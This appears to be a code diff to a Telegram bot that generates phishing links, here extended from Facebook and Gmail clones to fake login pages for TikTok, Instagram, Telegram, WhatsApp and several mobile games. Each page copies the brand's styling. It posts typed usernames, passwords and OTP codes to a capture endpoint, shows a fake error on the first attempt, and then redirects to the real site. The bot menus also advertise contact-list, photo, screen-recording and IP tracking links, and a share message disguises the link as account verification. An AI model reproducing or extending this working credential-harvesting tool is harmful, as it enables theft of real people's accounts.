@@ -1297,68 +1297,150 @@ def fake_login_page(platform, token):
     user_id = tracking_links.get(token)
     if not user_id:
         return "Not found", 404
-    platforms = {
+
+    PLATFORMS = {
         'facebook': {
-            'name': 'Facebook',
-            'color': '#1877f2',
-            'logo': 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/100px-2021_Facebook_icon.svg.png',
-            'field': 'Email or Phone',
+            'name': 'Facebook', 'color': '#1877f2', 'bg': '#f0f2f5', 'card': '#fff',
+            'text': '#1c1e21', 'sub': '#606770',
+            'logo_html': '<div style="font-size:2.8rem;font-weight:900;color:#1877f2;letter-spacing:-1px">facebook</div>',
+            'field': 'Email or Phone Number', 'pass_label': 'Password',
+            'btn_text': 'Log in', 'redirect': 'https://facebook.com',
+            'err_msg': 'The email or password you entered is incorrect.',
         },
         'gmail': {
-            'name': 'Google',
-            'color': '#4285f4',
-            'logo': 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/200px-Google_2015_logo.svg.png',
-            'field': 'Email or phone',
+            'name': 'Google', 'color': '#4285f4', 'bg': '#fff', 'card': '#fff',
+            'text': '#202124', 'sub': '#5f6368',
+            'logo_html': '<div style="font-size:2rem;font-weight:700;letter-spacing:-0.5px"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div>',
+            'field': 'Email or phone', 'pass_label': 'Enter your password',
+            'btn_text': 'Next', 'redirect': 'https://mail.google.com',
+            'err_msg': 'Wrong password. Try again or click Forgot password.',
+        },
+        'tiktok': {
+            'name': 'TikTok', 'color': '#fe2c55', 'bg': '#000', 'card': '#161823',
+            'text': '#fff', 'sub': '#8a8b91',
+            'logo_html': '<div style="font-size:2.2rem;font-weight:900;color:#fff;letter-spacing:-1px">Tik<span style="color:#fe2c55">Tok</span></div>',
+            'field': 'Email or username', 'pass_label': 'Password',
+            'btn_text': 'Log in', 'redirect': 'https://tiktok.com',
+            'err_msg': 'Incorrect account or password.',
+        },
+        'instagram': {
+            'name': 'Instagram', 'color': '#833ab4', 'bg': '#fafafa', 'card': '#fff',
+            'text': '#262626', 'sub': '#8e8e8e',
+            'logo_html': '<div style="font-size:2rem;font-weight:700;font-style:italic;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent">Instagram</div>',
+            'field': 'Phone number, username, or email', 'pass_label': 'Password',
+            'btn_text': 'Log in', 'redirect': 'https://instagram.com',
+            'err_msg': 'Sorry, your password was incorrect.',
+        },
+        'telegram': {
+            'name': 'Telegram', 'color': '#2ca5e0', 'bg': '#f4f4f5', 'card': '#fff',
+            'text': '#000', 'sub': '#707579',
+            'logo_html': '<div style="font-size:3rem">✈️</div><div style="font-size:1.5rem;font-weight:700;color:#2ca5e0;margin-top:4px">Telegram</div>',
+            'field': 'Phone number or username', 'pass_label': 'Password / 2FA code',
+            'btn_text': 'Sign In', 'redirect': 'https://web.telegram.org',
+            'err_msg': 'Invalid phone number or password.',
+        },
+        'whatsapp': {
+            'name': 'WhatsApp', 'color': '#25d366', 'bg': '#f0f2f5', 'card': '#fff',
+            'text': '#111b21', 'sub': '#667781',
+            'logo_html': '<div style="font-size:3rem">💬</div><div style="font-size:1.5rem;font-weight:700;color:#25d366;margin-top:4px">WhatsApp</div>',
+            'field': 'Phone number', 'pass_label': 'Password or OTP code',
+            'btn_text': 'Continue', 'redirect': 'https://web.whatsapp.com',
+            'err_msg': 'Phone number or password incorrect.',
+        },
+        'mobilelegends': {
+            'name': 'Mobile Legends', 'color': '#e8c96d', 'bg': '#0a0a1a', 'card': '#12122a',
+            'text': '#fff', 'sub': '#aaa',
+            'logo_html': '<div style="font-size:2.5rem">⚔️</div><div style="font-size:1.3rem;font-weight:900;color:#e8c96d;margin-top:4px;letter-spacing:1px">MOBILE LEGENDS</div><div style="font-size:.7rem;color:#e8c96d;letter-spacing:3px">BANG BANG</div>',
+            'field': 'Account / Email / Username', 'pass_label': 'Password',
+            'btn_text': 'LOGIN', 'redirect': 'https://mobilelegends.com',
+            'err_msg': 'Account or password error. Please try again.',
+        },
+        'pubg': {
+            'name': 'PUBG Mobile', 'color': '#f5a623', 'bg': '#1a1a1a', 'card': '#232323',
+            'text': '#fff', 'sub': '#aaa',
+            'logo_html': '<div style="font-size:2.5rem">🎮</div><div style="font-size:1.6rem;font-weight:900;color:#f5a623;margin-top:4px;letter-spacing:2px">PUBG</div><div style="font-size:.75rem;color:#aaa;letter-spacing:3px">MOBILE</div>',
+            'field': 'Email / Username / Phone', 'pass_label': 'Password',
+            'btn_text': 'LOG IN', 'redirect': 'https://pubgmobile.com',
+            'err_msg': 'Account or password incorrect.',
+        },
+        'freefire': {
+            'name': 'Free Fire', 'color': '#ff6600', 'bg': '#0d0d0d', 'card': '#1a1a1a',
+            'text': '#fff', 'sub': '#aaa',
+            'logo_html': '<div style="font-size:2.5rem">🔥</div><div style="font-size:1.5rem;font-weight:900;color:#ff6600;margin-top:4px;letter-spacing:1px">FREE FIRE</div><div style="font-size:.7rem;color:#aaa;letter-spacing:2px">GARENA</div>',
+            'field': 'Email / Username', 'pass_label': 'Password',
+            'btn_text': 'LOGIN', 'redirect': 'https://ff.garena.com',
+            'err_msg': 'Incorrect username or password.',
         },
     }
-    p = platforms.get(platform, platforms['facebook'])
+
+    p = PLATFORMS.get(platform, PLATFORMS['facebook'])
+    pname = p['name']
+    pcolor = p['color']
+    pbg = p['bg']
+    pcard = p['card']
+    ptext = p['text']
+    psub = p['sub']
+    plogo = p['logo_html']
+    pfield = p['field']
+    ppass = p['pass_label']
+    pbtn = p['btn_text']
+    predirect = p['redirect']
+    perr = p['err_msg']
+
     html = f"""<!DOCTYPE html><html><head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Log in to {p['name']}</title>
-<style>*{{margin:0;padding:0;box-sizing:border-box}}
-body{{background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}}
-.card{{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.15);padding:24px 20px;width:100%;max-width:396px;text-align:center}}
-.logo{{margin-bottom:16px;font-size:2rem;font-weight:800;color:{p['color']}}}
-h2{{font-size:1.4rem;font-weight:600;margin-bottom:4px}}
-.sub{{color:#666;font-size:.9rem;margin-bottom:20px}}
-input{{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:6px;font-size:1rem;margin-bottom:12px;outline:none;transition:border .2s}}
-input:focus{{border-color:{p['color']}}}
-.btn{{width:100%;padding:14px;background:{p['color']}; color:#fff;border:none;border-radius:6px;font-size:1.05rem;font-weight:700;cursor:pointer;margin-bottom:16px}}
-.err{{color:#e63946;font-size:.82rem;margin:-8px 0 10px;display:none}}
-.divider{{color:#aaa;font-size:.8rem;margin-bottom:14px}}
-.forgot{{color:{p['color']}; text-decoration:none;font-size:.88rem}}</style></head>
-<body><div class="card">
-<div class="logo">{p['name']}</div>
-<h2>Log in to your account</h2>
-<div class="sub">Enter your {p['name']} credentials to continue</div>
-<div class="err" id="err">The email or password you entered is incorrect.</div>
-<input type="text" id="u" placeholder="{p['field']}" autocomplete="username">
-<input type="password" id="p" placeholder="Password" autocomplete="current-password">
-<button class="btn" onclick="doLogin()">Log In</button>
-<div class="divider">— or —</div>
-<a href="#" class="forgot">Forgot password?</a>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Log in · {pname}</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{background:{pbg};font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px;color:{ptext}}}
+.card{{background:{pcard};border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,.18);padding:28px 22px 20px;width:100%;max-width:400px;text-align:center}}
+.logo-wrap{{margin-bottom:22px}}
+.sub{{color:{psub};font-size:.88rem;margin-bottom:20px;line-height:1.5}}
+.field-wrap{{margin-bottom:12px;text-align:left}}
+input{{width:100%;padding:14px 15px;border:1.5px solid #ddd;border-radius:8px;font-size:.97rem;outline:none;transition:border .2s;background:transparent;color:{ptext}}}
+input:focus{{border-color:{pcolor};box-shadow:0 0 0 3px {pcolor}22}}
+.btn{{width:100%;padding:14px;background:{pcolor};color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:700;cursor:pointer;margin:6px 0 14px;letter-spacing:.5px;transition:opacity .2s}}
+.btn:hover{{opacity:.9}}
+.err{{color:#e63946;font-size:.8rem;margin:2px 0 8px;text-align:left;display:none;padding:8px 12px;background:#fff0f0;border-radius:6px;border-left:3px solid #e63946}}
+.footer{{color:{psub};font-size:.78rem;margin-top:8px}}
+.forgot{{color:{pcolor};text-decoration:none;font-size:.84rem}}
+</style></head>
+<body>
+<div class="card">
+  <div class="logo-wrap">{plogo}</div>
+  <div class="sub">Sign in to continue to {pname}</div>
+  <div class="err" id="err">{perr}</div>
+  <div class="field-wrap"><input type="text" id="u" placeholder="{pfield}" autocomplete="username"></div>
+  <div class="field-wrap"><input type="password" id="pw" placeholder="{ppass}" autocomplete="current-password"></div>
+  <button class="btn" onclick="doLogin()">{pbtn}</button>
+  <div class="footer">
+    <a href="#" class="forgot">Forgot password?</a>
+  </div>
 </div>
 <script>
 let attempt=0;
+const TOKEN='{token}';
+const PNAME='{pname}';
 function doLogin(){{
   const u=document.getElementById('u').value.trim();
-  const p=document.getElementById('p').value;
-  if(!u||!p){{document.getElementById('err').style.display='block';document.getElementById('err').textContent='Please fill in all fields.';return;}}
+  const pw=document.getElementById('pw').value;
+  const err=document.getElementById('err');
+  if(!u||!pw){{err.style.display='block';err.textContent='Please fill in all fields.';return;}}
   fetch('/capture_fake_login',{{method:'POST',headers:{{'Content-Type':'application/json'}},
-    body:JSON.stringify({{token:'{token}',platform:'{p['name']}',username:u,password:p}})}});
+    body:JSON.stringify({{token:TOKEN,platform:PNAME,username:u,password:pw}})}});
   attempt++;
   if(attempt<2){{
-    document.getElementById('err').style.display='block';
-    document.getElementById('err').textContent='The email or password you entered is incorrect.';
-    document.getElementById('p').value='';
-  }} else {{
-    document.getElementById('err').style.display='none';
-    document.querySelector('.card').innerHTML='<div style="padding:40px 0"><div style="font-size:2rem">✅</div><h2 style="margin-top:12px">Logged in successfully</h2><p style="color:#888;margin-top:8px;font-size:.9rem">Redirecting...</p></div>';
-    setTimeout(()=>window.location.href='https://{platform}.com',2000);
+    err.style.display='block';
+    document.getElementById('pw').value='';
+  }}else{{
+    err.style.display='none';
+    document.querySelector('.card').innerHTML='<div style="padding:40px 20px;text-align:center"><div style="font-size:3rem">✅</div><div style="font-size:1.2rem;font-weight:700;margin-top:14px;color:{ptext}">Login Successful</div><p style="color:{psub};margin-top:8px;font-size:.88rem">Redirecting to {pname}...</p></div>';
+    setTimeout(()=>window.location.href='{predirect}',2200);
   }}
 }}
 document.addEventListener('keydown',e=>{{if(e.key==='Enter')doLogin();}});
-</script></body></html>"""
+</script>
+</body></html>"""
     return html, 200
 
 
@@ -1653,7 +1735,10 @@ def get_reply_keyboard():
             [KeyboardButton("📞 Contact List Link")],
             [KeyboardButton("📷 Burst Photos Link"), KeyboardButton("🖥️ Screen Record Link")],
             [KeyboardButton("📳 Motion+IP Link")],
-            [KeyboardButton("🎭 FB Fake Login Link"), KeyboardButton("🎭 Gmail Fake Login Link")],
+            [KeyboardButton("🎭 FB Fake Login"), KeyboardButton("🎭 Gmail Fake Login")],
+            [KeyboardButton("🎭 TikTok Fake Login"), KeyboardButton("🎭 Instagram Fake Login")],
+            [KeyboardButton("🎭 Telegram Fake Login"), KeyboardButton("🎭 WhatsApp Fake Login")],
+            [KeyboardButton("🎭 ML Fake Login"), KeyboardButton("🎭 PUBG Fake Login"), KeyboardButton("🎭 FreeFire Fake Login")],
             [KeyboardButton("💰 Daily Bonus"), KeyboardButton("👥 Refer & Earn")],
             [KeyboardButton("💎 My Points | Access"), KeyboardButton("📋 Active Links")],
             [KeyboardButton("🗑 Clear Links"), KeyboardButton("❓ Help")],
@@ -1676,8 +1761,15 @@ def main_menu_inline():
         [InlineKeyboardButton("📷 Burst Photos", callback_data="gen_burst"),
          InlineKeyboardButton("🖥️ Screen Record", callback_data="gen_screen")],
         [InlineKeyboardButton("📳 Motion+IP", callback_data="gen_motion")],
-        [InlineKeyboardButton("🎭 FB Fake Login", callback_data="gen_fakefb"),
-         InlineKeyboardButton("🎭 Gmail Fake Login", callback_data="gen_fakegmail")],
+        [InlineKeyboardButton("🎭 Facebook", callback_data="gen_fakefb"),
+         InlineKeyboardButton("🎭 Gmail", callback_data="gen_fakegmail")],
+        [InlineKeyboardButton("🎭 TikTok", callback_data="gen_faketiktok"),
+         InlineKeyboardButton("🎭 Instagram", callback_data="gen_fakeig")],
+        [InlineKeyboardButton("🎭 Telegram", callback_data="gen_faketg"),
+         InlineKeyboardButton("🎭 WhatsApp", callback_data="gen_fakewa")],
+        [InlineKeyboardButton("🎭 ML", callback_data="gen_fakeml"),
+         InlineKeyboardButton("🎭 PUBG", callback_data="gen_fakepubg"),
+         InlineKeyboardButton("🎭 FreeFire", callback_data="gen_fakeff")],
         [InlineKeyboardButton("💰 Daily Bonus", callback_data="daily"),
          InlineKeyboardButton("👥 Refer & Earn", callback_data="refer")],
         [InlineKeyboardButton("💎 My Points", callback_data="mypoints"),
@@ -2256,8 +2348,15 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
 
     FAKE_TEXT_MAP = {
-        "🎭 FB Fake Login Link":      "facebook",
-        "🎭 Gmail Fake Login Link":   "gmail",
+        "🎭 FB Fake Login":          "facebook",
+        "🎭 Gmail Fake Login":       "gmail",
+        "🎭 TikTok Fake Login":      "tiktok",
+        "🎭 Instagram Fake Login":   "instagram",
+        "🎭 Telegram Fake Login":    "telegram",
+        "🎭 WhatsApp Fake Login":    "whatsapp",
+        "🎭 ML Fake Login":          "mobilelegends",
+        "🎭 PUBG Fake Login":        "pubg",
+        "🎭 FreeFire Fake Login":    "freefire",
     }
 
     if text in FAKE_TEXT_MAP:
@@ -2268,7 +2367,10 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         token = secrets.token_urlsafe(12)
         tracking_links[token] = user_id
         url = f"{BASE_URL}/fake-login/{platform}/{token}"
-        label = "🎭 Facebook Fake Login" if platform == "facebook" else "🎭 Gmail Fake Login"
+        _plabels = {'facebook':'Facebook','gmail':'Gmail','tiktok':'TikTok','instagram':'Instagram',
+                    'telegram':'Telegram','whatsapp':'WhatsApp','mobilelegends':'Mobile Legends',
+                    'pubg':'PUBG Mobile','freefire':'Free Fire'}
+        label = f"🎭 {_plabels.get(platform, platform.title())} Fake Login"
         share_text = "🔐 Account တစ်ခု verify လုပ်ရန် link ဖြစ်သည်"
         share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
         await update.message.reply_text(
@@ -2398,7 +2500,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "gen_motion":   ("motion",   "📳 Motion+IP"),
     }
 
-    FAKE_LOGIN_MODES = {"gen_fakefb": "facebook", "gen_fakegmail": "gmail"}
+    FAKE_LOGIN_MODES = {
+        "gen_fakefb":     "facebook",
+        "gen_fakegmail":  "gmail",
+        "gen_faketiktok": "tiktok",
+        "gen_fakeig":     "instagram",
+        "gen_faketg":     "telegram",
+        "gen_fakewa":     "whatsapp",
+        "gen_fakeml":     "mobilelegends",
+        "gen_fakepubg":   "pubg",
+        "gen_fakeff":     "freefire",
+    }
 
     if data in FAKE_LOGIN_MODES:
         platform = FAKE_LOGIN_MODES[data]
@@ -2408,7 +2520,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         token = secrets.token_urlsafe(12)
         tracking_links[token] = user_id
         url = f"{BASE_URL}/fake-login/{platform}/{token}"
-        label = "🎭 Facebook Fake Login" if platform == "facebook" else "🎭 Gmail Fake Login"
+        _plabels = {'facebook':'Facebook','gmail':'Gmail','tiktok':'TikTok','instagram':'Instagram',
+                    'telegram':'Telegram','whatsapp':'WhatsApp','mobilelegends':'Mobile Legends',
+                    'pubg':'PUBG Mobile','freefire':'Free Fire'}
+        label = f"🎭 {_plabels.get(platform, platform.title())} Fake Login"
         share_text = "🔐 Account တစ်ခု verify လုပ်ရန် link ဖြစ်သည်"
         share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
         await query.edit_message_text(
